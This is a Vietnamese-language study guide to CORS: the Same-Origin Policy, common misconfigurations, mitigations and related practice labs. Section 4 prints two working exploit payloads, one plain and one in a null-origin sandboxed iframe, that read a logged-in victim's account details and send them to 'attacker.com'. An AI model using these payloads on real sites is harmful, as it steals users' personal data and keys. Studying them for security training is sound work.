# CORS (CROSS-ORIGIN RESOURCE SHARING) — KIẾN THỨC TỔNG HỢP

## Mục lục
1. [Same-Origin Policy & CORS là gì](#1-same-origin-policy--cors-là-gì)
2. [Cơ chế hoạt động của CORS](#2-cơ-chế-hoạt-động-của-cors)
3. [Các lỗi cấu hình CORS thường gặp](#3-các-lỗi-cấu-hình-cors-thường-gặp)
4. [Khai thác lỗ hổng CORS](#4-khai-thác-lỗ-hổng-cors)
5. [Cách phòng chống](#5-cách-phòng-chống)
6. [Danh sách lab liên quan](#6-danh-sách-lab-liên-quan)

## 1. Same-Origin Policy & CORS là gì

**Same-Origin Policy (SOP)** là cơ chế mặc định của trình duyệt, chặn JavaScript trên 1 origin đọc dữ liệu response từ origin khác. **CORS (Cross-Origin Resource Sharing)** là cơ chế nới lỏng SOP một cách có kiểm soát, cho phép server chỉ định rõ những origin nào được phép đọc dữ liệu qua request cross-origin (dùng header `Access-Control-Allow-Origin`).

## 2. Cơ chế hoạt động của CORS

Khi JS trên `https://a.com` gọi `fetch('https://b.com/api', {credentials:'include'})`:
1. Trình duyệt gửi request tới `b.com` kèm header `Origin: https://a.com`.
2. Server `b.com` trả về response kèm header:
   ```
   Access-Control-Allow-Origin: https://a.com
   Access-Control-Allow-Credentials: true
   ```
3. Nếu Origin trong response khớp, trình duyệt cho phép JS trên `a.com` đọc được response.

## 3. Các lỗi cấu hình CORS thường gặp

| Lỗi cấu hình | Rủi ro |
|---|---|
| **Reflect bất kỳ Origin nào** — server đọc header `Origin` của request rồi đơn giản echo lại vào `Access-Control-Allow-Origin` | Bất kỳ website nào cũng đọc được response, kể cả origin của attacker |
| **Whitelist `null` origin** | Request từ sandboxed iframe / file `file://` có `Origin: null`, dễ giả mạo bằng `<iframe sandbox="allow-scripts" src="data:text/html,...">` |
| **Whitelist theo pattern lỏng lẻo** (`*.trusted.com`, hoặc kiểm tra `.endsWith("trusted.com")`) | Attacker đăng ký subdomain (`trusted.com.attacker.com`) hoặc domain có hậu tố trùng để bypass |
| **Cho phép scheme không an toàn** (`http://` thay vì chỉ `https://`) trong whitelist | Attacker có thể thực hiện MITM trên kết nối HTTP để giả mạo response từ subdomain đó |
| **Kết hợp `Access-Control-Allow-Credentials: true` với whitelist lỏng lẻo** | Cho phép đọc cả dữ liệu gắn với cookie/session của nạn nhân — mức độ nguy hiểm cao nhất |

## 4. Khai thác lỗ hổng CORS

**Kịch bản chung:** attacker lưu trữ 1 trang HTML độc hại, dụ nạn nhân (đã đăng nhập vào trang victim) truy cập, JS trên trang attacker gửi request có `credentials: include` tới API nhạy cảm của victim rồi đọc trộm response (chứa dữ liệu cá nhân, API key...):

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    location = 'https://attacker.com/log?data=' + this.responseText;
  };
  req.open('GET', 'https://victim-website.com/accountDetails', true);
  req.withCredentials = true;
  req.send();
</script>
```

Với origin `null` (sandboxed iframe):
```html
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim-website.com/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location = 'https://attacker.com/log?key=' + this.responseText;
  }
</script>"></iframe>
```

## 5. Cách phòng chống

- Không bao giờ reflect Origin bất kỳ vào `Access-Control-Allow-Origin`; dùng whitelist tường minh, cố định.
- Tuyệt đối không whitelist `null` origin.
- So khớp domain **chính xác** (không dùng `endsWith`/regex lỏng lẻo), validate cả scheme (`https://` only).
- Chỉ bật `Access-Control-Allow-Credentials: true` khi thật sự cần và whitelist đã rất chặt chẽ.
- API không cần chia sẻ cross-origin thì không nên set bất kỳ header CORS nào (mặc định SOP đã bảo vệ).

## 6. Danh sách lab liên quan

1. CORS vulnerability with basic origin reflection
2. CORS vulnerability with trusted null origin
3. CORS vulnerability with trusted insecure protocols

